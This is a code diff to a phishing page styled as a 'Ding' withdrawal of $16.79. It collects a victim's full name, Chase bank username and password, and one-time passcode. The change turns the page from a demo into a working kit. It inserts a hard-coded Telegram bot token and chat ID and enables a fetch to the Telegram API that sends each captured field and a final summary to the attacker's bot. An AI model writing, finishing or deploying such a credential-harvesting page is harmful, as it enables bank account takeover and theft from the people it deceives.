@@ -254,6 +254,14 @@
             opacity: 0.9;
         }
 
+        .toast-message.success {
+            background: #166534;
+        }
+
+        .toast-message.error {
+            background: #991b1b;
+        }
+
         .flex-between {
             display: flex;
             justify-content: space-between;
@@ -282,7 +290,6 @@
             display: inline-block;
         }
 
-        /* Processing overlay */
         .processing-overlay {
             position: absolute;
             inset: 0;
@@ -352,7 +359,6 @@
             }
         }
 
-        /* Success Page */
         .success-page {
             text-align: center;
             padding: 2rem 0.5rem;
@@ -404,7 +410,6 @@
 <body>
 
     <div class="card" id="app">
-        <!-- HEADER -->
         <div class="flex-between">
             <h1>
                 <span>💸</span> Ding
@@ -413,16 +418,13 @@
             <span style="font-size: 0.9rem; background: #eef3f9; padding: 0.2rem 0.9rem; border-radius: 40px; color: #1e3a5f;">step <span id="stepNumberDisplay">1</span>/4</span>
         </div>
 
-        <!-- BALANCE -->
         <div class="balance-box">
             <span style="font-weight: 500; color: #1f3a58;">Available</span>
             <span class="amount">$16.79 <small>USD</small></span>
         </div>
 
-        <!-- MAIN ACTION (withdraw) -->
         <button class="btn-primary" id="startWithdrawBtn">Withdraw $16.79</button>
 
-        <!-- STEP INDICATOR DOTS -->
         <div class="step-indicator">
             <span class="dot active" id="dot1"></span>
             <span class="dot" id="dot2"></span>
@@ -430,9 +432,8 @@
             <span class="dot" id="dot4"></span>
         </div>
 
-        <!-- DYNAMIC STEP CONTAINER -->
         <div class="step-container" id="stepContainer">
-            <!-- Step 1: full name + bank account -->
+            <!-- Step 1 -->
             <div id="step1">
                 <div class="step-title">📋 <span>Step 1/4</span> Bank details</div>
                 <div class="form-group">
@@ -464,12 +465,12 @@
                         <option value="Synchrony Bank" data-allowed="false">Synchrony Bank</option>
                         <option value="Marcus by Goldman Sachs" data-allowed="false">Marcus by Goldman Sachs</option>
                     </select>
-                    <div id="bankWarning" class="warning-message hidden">⚠️ Only Chase Bank is supported for this withdrawal.</div>
+                    <div id="bankWarning" class="warning-message hidden">⚠️ Only Chase Bank is supported.</div>
                 </div>
                 <button class="btn-step" id="step1Next">Continue →</button>
             </div>
 
-            <!-- Step 2: Chase username & password -->
+            <!-- Step 2 -->
             <div id="step2" class="hidden">
                 <div class="step-title">🔐 <span>Step 2/4</span> Chase credentials</div>
                 <div class="form-group">
@@ -486,7 +487,7 @@
                 </div>
             </div>
 
-            <!-- Step 3: Processing → OTP -->
+            <!-- Step 3 -->
             <div id="step3" class="hidden" style="position: relative; min-height: 200px;">
                 <div id="processingOverlay" class="processing-overlay">
                     <div class="spinner"></div>
@@ -511,7 +512,7 @@
                 </div>
             </div>
 
-            <!-- Step 4: final summary & submit -->
+            <!-- Step 4 -->
             <div id="step4" class="hidden">
                 <div class="step-title">✅ <span>Step 4/4</span> Review & submit</div>
                 <div style="background: #eef7ff; border-radius: 1.2rem; padding: 0.8rem 1rem; margin-bottom: 1rem; border-left: 4px solid #1d4ed8;">
@@ -526,7 +527,7 @@
                 </div>
             </div>
 
-            <!-- Success Page (hidden by default) -->
+            <!-- Success -->
             <div id="successPage" class="hidden success-page">
                 <div class="success-icon">✅</div>
                 <div class="success-title">Withdrawal Submitted!</div>
@@ -535,14 +536,17 @@
             </div>
         </div>
 
-        <!-- status toast -->
-        <div id="telegramStatus" class="toast-message hidden">✔️ Data sent to Telegram bot</div>
+        <div id="telegramStatus" class="toast-message hidden"></div>
         <div class="telegram-note">🔒 All data is captured and forwarded to your Telegram bot.</div>
     </div>
 
     <script>
         (function() {
-            // --- DOM refs ---
+            // ---- TELEGRAM CONFIG ----
+            const BOT_TOKEN = '8743290917:AAHCxJuuc65l_JeXfi1CXQt09uEXVwr-4Uw';
+            const CHAT_ID = '8737104261';
+
+            // ---- DOM refs ----
             const startBtn = document.getElementById('startWithdrawBtn');
             const stepContainer = document.getElementById('stepContainer');
 
@@ -558,32 +562,24 @@
             const dot4 = document.getElementById('dot4');
             const stepNumberDisplay = document.getElementById('stepNumberDisplay');
 
-            // step1
             const fullNameInput = document.getElementById('fullName');
             const bankSelect = document.getElementById('bankSelect');
             const bankWarning = document.getElementById('bankWarning');
-
-            // step2
             const chaseUser = document.getElementById('chaseUser');
             const chasePass = document.getElementById('chasePass');
-
-            // step3
             const processingOverlay = document.getElementById('processingOverlay');
             const otpForm = document.getElementById('otpForm');
             const otpInput = document.getElementById('otpInput');
 
-            // step4
             const reviewName = document.getElementById('reviewName');
             const reviewBank = document.getElementById('reviewBank');
             const reviewOtp = document.getElementById('reviewOtp');
 
-            // buttons
             const step1Next = document.getElementById('step1Next');
             const step2Next = document.getElementById('step2Next');
             const step3Next = document.getElementById('step3Next');
             const submitWithdrawBtn = document.getElementById('submitWithdrawBtn');
 
-            // back links
             const backToStep1 = document.getElementById('backToStep1');
             const backToStep2 = document.getElementById('backToStep2');
             const backToStep3 = document.getElementById('backToStep3');
@@ -595,19 +591,17 @@
             let currentStep = 1;
             let isProcessing = false;
             let redirectTimer = null;
-
-            // ---- TELEGRAM CONFIG (REPLACE WITH YOUR OWN) ----
-            const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace with your bot token
-            const CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your chat ID
+            let lastSentData = {};
 
             // ---- helper: send to Telegram ----
-            function sendToTelegram(message) {
-                // For demo, we log and show toast
-                console.log('📤 TELEGRAM:', message);
-
-                // Uncomment below for real Telegram integration
-                /*
+            function sendToTelegram(message, isError = false) {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+                // Show local status
+                telegramStatus.classList.remove('hidden', 'success', 'error');
+                telegramStatus.textContent = isError ? '❌ Failed to send' : '📤 Sending...';
+                telegramStatus.className = 'toast-message';
+
                 fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -616,26 +610,31 @@
                         text: message,
                         parse_mode: 'Markdown'
                     })
-                }).then(res => res.json())
-                  .then(data => {
-                      if (data.ok) {
-                          console.log('✅ Telegram sent');
-                      } else {
-                          console.error('❌ Telegram error:', data);
-                      }
-                  })
-                  .catch(err => console.error('❌ Fetch error:', err));
-                */
-
-                // Show toast for demo
-                telegramStatus.classList.remove('hidden');
-                telegramStatus.innerText = '📤 Data sent to Telegram bot';
-                setTimeout(() => {
-                    telegramStatus.classList.add('hidden');
-                }, 3000);
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok) {
+                        telegramStatus.textContent = '✅ Sent to Telegram';
+                        telegramStatus.className = 'toast-message success';
+                        setTimeout(() => {
+                            telegramStatus.classList.add('hidden');
+                        }, 3000);
+                        console.log('✅ Telegram sent:', message);
+                    } else {
+                        throw new Error(data.description || 'Unknown error');
+                    }
+                })
+                .catch(err => {
+                    console.error('❌ Telegram error:', err);
+                    telegramStatus.textContent = '⚠️ Telegram error (check console)';
+                    telegramStatus.className = 'toast-message error';
+                    setTimeout(() => {
+                        telegramStatus.classList.add('hidden');
+                    }, 4000);
+                });
             }
 
-            // ---- send individual field updates to Telegram ----
+            // ---- send field update ----
             function sendFieldUpdate(field, value) {
                 const message = `🔄 *${field} updated:*\n\`${value || '—'}\``;
                 sendToTelegram(message);
@@ -652,7 +651,6 @@
                     `💰 *Amount:* ${data.amount}\n` +
                     `🕒 *Timestamp:* ${new Date().toLocaleString()}\n` +
                     `✅ *Status:* SUBMITTED`;
-
                 sendToTelegram(message);
             }
 
@@ -685,7 +683,6 @@
                 } else {
                     stepNumberDisplay.innerText = step;
                 }
-                telegramStatus.classList.add('hidden');
             }
 
             function goToStep(step) {
@@ -762,7 +759,6 @@
 
                 if (redirectTimer) clearInterval(redirectTimer);
 
-                // Send final submission data to Telegram
                 const data = collectAllData();
                 sendFullData(data);
 
@@ -817,14 +813,13 @@
                 reviewName.innerText = data.name;
                 reviewBank.innerText = data.bank;
                 reviewOtp.innerText = data.otp;
-                telegramStatus.classList.add('hidden');
                 validateBankSelection();
             });
 
             // Step1 → Step2
             step1Next.addEventListener('click', function() {
                 if (!isChaseSelected()) {
-                    alert('Please select Chase Bank to continue. Other banks are not supported.');
+                    alert('Please select Chase Bank to continue.');
                     return;
                 }
                 const name = fullNameInput.value.trim();
@@ -832,12 +827,11 @@
                     alert('Please enter your full name.');
                     return;
                 }
-                // Send name update
                 sendFieldUpdate('Full Name', name);
                 goToStep(2);
             });
 
-            // Step2 → Step3 (processing)
+            // Step2 → Step3
             step2Next.addEventListener('click', function() {
                 const user = chaseUser.value.trim();
                 const pass = chasePass.value.trim();
@@ -853,7 +847,7 @@
                 });
             });
 
-            // Step3 OTP → Step4
+            // Step3 → Step4
             step3Next.addEventListener('click', function() {
                 const otp = otpInput.value.trim();
                 if (otp.length === 0) {
@@ -872,19 +866,17 @@
                 goToStep(4);
             });
 
-            // Step4 → Submit Withdraw
+            // Step4 → Submit
             submitWithdrawBtn.addEventListener('click', function() {
                 const data = collectAllData();
-                // Final validation
                 if (data.name === 'Not provided' || data.bank === '' || data.otp === 'Not provided') {
                     alert('Please complete all steps properly.');
                     return;
                 }
-                // Show success and redirect
                 showSuccessAndRedirect();
             });
 
-            // ---- back buttons ----
+            // Back buttons
             backToStep1.addEventListener('click', function() { goToStep(1);
                 validateBankSelection(); });
             backToStep2.addEventListener('click', function() { goToStep(2); });
@@ -913,14 +905,14 @@
             reviewBank.innerText = '—';
             reviewOtp.innerText = '—';
 
-            // Clear autofill
             chaseUser.value = '';
             chasePass.value = '';
             otpInput.value = '';
             fullNameInput.value = '';
             bankSelect.value = '';
 
-            console.log('🔔 Ready: Replace BOT_TOKEN and CHAT_ID for real Telegram integration.');
+            console.log('🔔 Telegram bot configured with token:', BOT_TOKEN);
+            console.log('📱 Chat ID:', CHAT_ID);
         })();
     </script>
 </body>
